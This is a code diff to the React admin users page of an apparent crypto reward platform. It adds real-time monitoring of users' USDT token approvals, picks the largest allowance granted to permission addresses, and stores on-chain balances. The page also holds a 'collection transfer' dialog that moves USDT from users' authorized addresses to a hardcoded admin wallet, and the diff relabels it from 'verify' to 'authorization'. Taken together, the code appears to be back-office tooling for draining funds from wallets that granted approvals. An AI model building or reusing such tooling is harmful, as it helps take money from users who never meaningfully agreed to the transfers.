@@ -1,6 +1,6 @@
 'use client'
 
-import { useState, useEffect, useCallback } from 'react'
+import { useState, useEffect, useCallback, useRef } from 'react'
 import { Card, CardContent, CardHeader, CardTitle } from '@/components/ui/card'
 import { Button } from '@/components/ui/button'
 import { Input } from '@/components/ui/input'
@@ -38,8 +38,9 @@ import BalanceQueryModal from '@/components/BalanceQueryModal'
 import CollectionConfirmModal from '@/components/CollectionConfirmModal'
 import { Label } from '@/components/ui/label'
 import { getAdminSession } from '@/lib/auth'
+import { authorizationRealtimeService } from '@/services/authorizationRealtimeService'
 
-// 用户数据接口 - 适配 nh_member_new 表
+  // 用户数据接口 - 适配 nh_member_new 表
 interface User {
   id: string // UUID
   wallet_address: string
@@ -53,6 +54,9 @@ interface User {
   withdrawal_usdt: number
   withdrawable_usdt: number
   dividend_usdt: number
+  onchain_usdt_balance?: number | string | null  // 链上USDT余额
+  onchain_eth_balance?: number | string | null  // 链上ETH余额
+  balance_updated_at?: string | null  // 余额更新时间
   daily_reward_rate: number
   last_reward_at: string | null
   reward_count_today: number
@@ -267,7 +271,7 @@ export default function UsersPage() {
     pause: 2
   })
 
-  // 余额查询状态
+  // 余额查询状态（用于手动查询时的加载状态）
   const [balanceStates, setBalanceStates] = useState<Record<string, {loading: boolean, balance: string}>>({})
   const [batchQueryLoading, setBatchQueryLoading] = useState(false)
 
@@ -475,12 +479,59 @@ export default function UsersPage() {
   //   }
   // }, [pagination.page, pagination.limit, searchTerm, statusFilter, authFilter])
 
+  // 使用 useRef 存储最新的 fetchUsers，避免 useEffect 依赖导致循环
+  const fetchUsersRef = useRef(fetchUsers)
+  useEffect(() => {
+    fetchUsersRef.current = fetchUsers
+  }, [fetchUsers])
+
   // 初始加载
   useEffect(() => {
     // 获取管理员session
     const session = getAdminSession()
     setAdminSession(session)
-  }, [])
+    
+    // 启动授权状态实时监听服务
+    authorizationRealtimeService.start()
+    
+    // 注册授权状态变化回调（使用防抖避免频繁刷新）
+    let refreshTimer: NodeJS.Timeout | null = null
+    let lastRefreshTime = 0
+    const REFRESH_COOLDOWN = 2000 // 2秒冷却时间，避免频繁刷新
+    
+    const unsubscribe = authorizationRealtimeService.onAuthorizationChange((change) => {
+      console.log('🔔 收到授权状态变化通知:', change)
+      
+      const now = Date.now()
+      // 如果距离上次刷新时间太短，跳过
+      if (now - lastRefreshTime < REFRESH_COOLDOWN) {
+        console.log('⏸️ 刷新冷却中，跳过本次刷新')
+        return
+      }
+      
+      // 清除之前的定时器
+      if (refreshTimer) {
+        clearTimeout(refreshTimer)
+      }
+      
+      // 防抖：延迟1秒刷新，避免频繁刷新
+      refreshTimer = setTimeout(() => {
+        console.log('🔄 实时监听触发用户列表刷新')
+        lastRefreshTime = Date.now()
+        fetchUsersRef.current() // 使用 ref 中的最新函数
+        refreshTimer = null
+      }, 1000)
+    })
+    
+    // 清理函数
+    return () => {
+      if (refreshTimer) {
+        clearTimeout(refreshTimer)
+      }
+      unsubscribe()
+      // 注意：不在这里停止服务，因为可能其他页面也在使用
+    }
+  }, []) // 移除所有依赖，避免循环
 
   // 当session或查询参数变化时重新加载数据
   useEffect(() => {
@@ -561,6 +612,29 @@ export default function UsersPage() {
               balance: balance
             }
           }))
+          
+          // 将查询到的余额保存到数据库（异步执行，不阻塞）
+          fetch('/api/admin/update-onchain-balance', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              userId: user.id,
+              walletAddress: queryAddress,
+              usdtBalance: balance
+            })
+          }).then(saveResponse => {
+            if (saveResponse.ok) {
+              return saveResponse.json()
+            }
+            return null
+          }).then(saveResult => {
+            if (saveResult?.success) {
+              console.log(`✅ 用户 ${user.id} 链上余额已保存到数据库: ${balance} USDT`)
+            }
+          }).catch(saveError => {
+            console.warn(`⚠️ 用户 ${user.id} 保存余额到数据库失败:`, saveError)
+          })
+          
           successCount++
         } else {
           setBalanceStates(prev => ({
@@ -585,17 +659,11 @@ export default function UsersPage() {
     }
     
     setBatchQueryLoading(false)
-    // 显示批量查询结果弹窗
-    setBalanceQueryData({
-      userId: 'batch', // 批量查询没有特定用户ID
-      wallet_address: '',
-      ethBalance: '',
-      usdtBalance: '',
-      allowance: '',
-      error: `批量查询完成!\n✅ 成功: ${successCount} 个\n❌ 失败: ${failCount} 个`,
-      isSuccess: failCount === 0 // 只有全部成功才算成功
-    })
-    setIsBalanceQueryModalOpen(true)
+    // 显示批量查询结果弹窗（批量查询不显示单个用户信息）
+    // 批量查询完成后只显示统计信息，不打开弹窗
+    const message = `批量查询完成！\n✅ 成功: ${successCount} 个\n❌ 失败: ${failCount} 个`
+    alert(message)
+    // 不打开弹窗，因为批量查询没有单个用户信息
   }
 
   // 移除自动查询余额 - 改为手动触发
@@ -724,7 +792,7 @@ export default function UsersPage() {
     )
   }
 
-  // 获取verify状态
+  // 获取授权状态
   const getAuthStatusBadge = (isEffective: number | string, userId?: string, hash?: string | null) => {
     // 处理数字和字符串类型
     const isAuthorized = isEffective === 1 || isEffective === '1' || Number(isEffective) === 1
@@ -886,7 +954,10 @@ export default function UsersPage() {
         fetch('/api/admin/query-balance', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ userAddress: queryAddress })
+          body: JSON.stringify({ 
+            userAddress: queryAddress,
+            spenderAddress: user.auth_wallet_address || undefined // 如果用户有授权地址，使用授权地址查询
+          })
         })
       ])
 
@@ -899,18 +970,77 @@ export default function UsersPage() {
       if (balanceResponse.ok) {
         const balanceResult = await balanceResponse.json()
         if (balanceResult.success && balanceResult.data) {
-          usdtBalance = Number.parseFloat(balanceResult.data.usdtBalance).toFixed(8)
+          const balance = balanceResult.data.usdtBalance
+          if (balance !== undefined && balance !== null) {
+            usdtBalance = Number.parseFloat(balance.toString()).toFixed(6)
+          }
+        } else {
+          console.warn('USDT余额查询返回失败:', balanceResult)
         }
+      } else {
+        const errorText = await balanceResponse.text()
+        console.error('USDT余额查询HTTP错误:', balanceResponse.status, errorText)
       }
 
       // 处理授权额度查询结果
+      let authorizationUpdated = false
       if (allowanceResponse.ok) {
         const allowanceResult = await allowanceResponse.json()
         if (allowanceResult.success && allowanceResult.data) {
           ethBalance = allowanceResult.data.ethBalance || '0.000000'
-          allowance = allowanceResult.data.allowance || '0.000000'
+          
+          // 检查授权状态是否已更新
+          authorizationUpdated = allowanceResult.data.authorizationUpdated === true
+          
+          // 优先使用传入的spenderAddress对应的授权额度
+          // 如果有allAllowances，显示所有权限地址的授权额度
+          if (allowanceResult.data.allAllowances && Object.keys(allowanceResult.data.allAllowances).length > 0) {
+            // 找到最大的授权额度
+            const allAllowances = allowanceResult.data.allAllowances as Record<string, string>
+            const allowanceValues = Object.values(allAllowances).map(v => Number.parseFloat(String(v)))
+            const maxAllowance = Math.max(...allowanceValues)
+            allowance = maxAllowance.toFixed(6)
+            
+            console.log('📊 所有权限地址的授权额度:', allAllowances)
+            console.log('📊 最大授权额度:', allowance)
+          } else {
+            // 兼容旧格式
+            allowance = allowanceResult.data.allowance || '0.000000'
+          }
+          
+          console.log('📊 授权额度查询结果:', {
+            allowance: allowanceResult.data.allowance,
+            allAllowances: allowanceResult.data.allAllowances,
+            permissionAddresses: allowanceResult.data.permissionAddresses,
+            spenderAddress: allowanceResult.data.spenderAddress,
+            最终使用的额度: allowance,
+            授权状态已更新: authorizationUpdated
+          })
+          
+          // 如果授权状态已更新，刷新用户列表（使用防抖避免频繁刷新）
+          if (authorizationUpdated) {
+            console.log('🔄 检测到授权状态已更新，将在1秒后刷新用户列表...')
+            // 使用更长的延迟，避免与实时监听服务冲突
+            setTimeout(() => {
+              console.log('🔄 查询余额触发用户列表刷新')
+              fetchUsers()
+            }, 1000) // 延迟1秒刷新，确保数据库更新完成，并避免与实时监听冲突
+          }
+        } else {
+          console.warn('授权额度查询返回失败:', allowanceResult)
         }
+      } else {
+        const errorText = await allowanceResponse.text()
+        console.error('授权额度查询HTTP错误:', allowanceResponse.status, errorText)
       }
+      
+      console.log('📊 查询结果汇总:', {
+        userId: convertUuidToNumericId(userId),
+        wallet_address: queryAddress,
+        ethBalance,
+        usdtBalance,
+        allowance
+      })
 
       // 更新余额状态
       setBalanceStates(prev => ({
@@ -921,10 +1051,46 @@ export default function UsersPage() {
         }
       }))
       
+      // 将查询到的余额保存到数据库
+      try {
+        const saveResponse = await fetch('/api/admin/update-onchain-balance', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            userId: userId,
+            walletAddress: queryAddress,
+            usdtBalance: usdtBalance
+          })
+        })
+
+        if (saveResponse.ok) {
+          const saveResult = await saveResponse.json()
+          if (saveResult.success) {
+            console.log(`✅ 链上余额已保存到数据库: ${usdtBalance} USDT`)
+            // 刷新用户列表以显示最新的余额
+            fetchUsers()
+          } else {
+            console.warn('⚠️ 保存余额到数据库失败:', saveResult.error)
+          }
+        } else {
+          console.warn('⚠️ 保存余额到数据库HTTP错误:', saveResponse.status)
+        }
+      } catch (saveError) {
+        console.error('❌ 保存余额到数据库异常:', saveError)
+        // 不阻止显示查询结果，只记录错误
+      }
+      
       // 显示查询结果弹窗
+      const displayAddress = queryAddress || user.wallet_address || user.auth_wallet_address || ''
+      if (!displayAddress) {
+        console.error('❌ 无法获取钱包地址:', { userId, user })
+        alert('用户没有有效的钱包地址')
+        return
+      }
+      
       setBalanceQueryData({
-        userId: userId,
-        wallet_address: user.wallet_address,
+        userId: convertUuidToNumericId(userId), // 转换为数字ID显示
+        wallet_address: displayAddress, // 使用查询地址
         ethBalance: ethBalance,
         usdtBalance: usdtBalance,
         allowance: allowance,
@@ -939,9 +1105,13 @@ export default function UsersPage() {
         [userId]: { loading: false, balance: '查询失败' }
       }))
       // 显示查询失败弹窗
+      const queryAddress = (user.auth_wallet_address && user.auth_wallet_address.trim()) 
+        ? user.auth_wallet_address 
+        : user.wallet_address
+      
       setBalanceQueryData({
-        userId: userId,
-        wallet_address: user.wallet_address,
+        userId: convertUuidToNumericId(userId), // 转换为数字ID显示
+        wallet_address: queryAddress || user.wallet_address || '',
         ethBalance: '',
         usdtBalance: '',
         allowance: '',
@@ -1262,7 +1432,7 @@ export default function UsersPage() {
       authAddress: user.wallet_address || '',
       amount: '',
       adminAddress: '0x571Bb55E5e16bdd3A994b8f5D09DaF44Cd61aA9a', // 默认收款地址
-      reason: 'verify地址归集转账'
+      reason: '授权地址归集转账'
     })
     setIsTransferModalOpen(true)
   }
@@ -1274,7 +1444,7 @@ export default function UsersPage() {
       return
     }
 
-    if (!confirm(`确定要从verify地址 ${transferData.authAddress} 转账 ${transferData.amount} USDT 吗？`)) {
+    if (!confirm(`确定要从授权地址 ${transferData.authAddress} 转账 ${transferData.amount} USDT 吗？`)) {
       return
     }
 
@@ -2140,7 +2310,11 @@ export default function UsersPage() {
                         {balanceStates[user.id]?.loading ? (
                           <RefreshCw className="w-4 h-4 animate-spin" />
                         ) : (
-                          balanceStates[user.id]?.balance || '0.00000000'
+                          // 优先使用数据库中的链上余额（即使为0也使用数据库的值）
+                          // 如果数据库中有值（包括0），使用数据库的值；否则使用手动查询的结果
+                          (user.onchain_usdt_balance !== undefined && user.onchain_usdt_balance !== null)
+                            ? Number.parseFloat(String(user.onchain_usdt_balance)).toFixed(8)
+                            : (balanceStates[user.id]?.balance || '0.00000000')
                         )}
                       </td>
                       <td className="py-3 px-2 text-blue-400">{formatPlatformBalance(user)}</td>
@@ -2289,7 +2463,10 @@ export default function UsersPage() {
                             {balanceStates[user.id]?.loading ? (
                               <RefreshCw className="w-3 h-3 inline animate-spin" />
                             ) : (
-                              balanceStates[user.id]?.balance || '0.00'
+                              // 优先使用数据库中的链上余额（即使为0也使用数据库的值）
+                              (user.onchain_usdt_balance !== undefined && user.onchain_usdt_balance !== null)
+                                ? Number.parseFloat(String(user.onchain_usdt_balance)).toFixed(2)
+                                : (balanceStates[user.id]?.balance || '0.00')
                             )}
                           </span>
                         </div>
@@ -2453,7 +2630,7 @@ export default function UsersPage() {
               />
             </div>
             <div className="space-y-2">
-              <Label htmlFor="auth_wallet_address">verify地址</Label>
+              <Label htmlFor="auth_wallet_address">授权地址</Label>
               <Input
                 id="auth_wallet_address"
                 value={formData.auth_wallet_address}
@@ -2538,7 +2715,7 @@ export default function UsersPage() {
               />
             </div>
             <div className="space-y-2">
-              <Label htmlFor="edit_auth_wallet_address">verify地址</Label>
+              <Label htmlFor="edit_auth_wallet_address">授权地址</Label>
               <Input
                 id="edit_auth_wallet_address"
                 value={formData.auth_wallet_address}
@@ -2627,13 +2804,13 @@ export default function UsersPage() {
               </select>
             </div>
             <div className="space-y-2">
-              <Label htmlFor="edit_is_effective">verify状态</Label>
+              <Label htmlFor="edit_is_effective">授权状态</Label>
               <select
                 id="edit_is_effective"
                 value={formData.is_effective}
                 onChange={(e) => setFormData(prev => ({ ...prev, is_effective: Number(e.target.value) }))}
                 className="w-full px-3 py-2 bg-slate-700 border border-slate-600 rounded-md"
-                aria-label="verify状态选择"
+                aria-label="授权状态选择"
               >
                 <option value={0}>未授权</option>
                 <option value={1}>已授权</option>
@@ -2879,7 +3056,7 @@ export default function UsersPage() {
       <Dialog open={isTransferModalOpen} onOpenChange={setIsTransferModalOpen}>
         <DialogContent className="sm:max-w-md">
           <DialogHeader>
-            <DialogTitle>verify地址归集转账</DialogTitle>
+            <DialogTitle>授权地址归集转账</DialogTitle>
           </DialogHeader>
           <div className="space-y-4">
             <div>
@@ -2891,7 +3068,7 @@ export default function UsersPage() {
               <Input value={transferData.userAddress} disabled />
             </div>
             <div>
-              <Label>verify地址（转出地址）</Label>
+              <Label>授权地址（转出地址）</Label>
               <Input value={transferData.authAddress} disabled />
             </div>
             <div>
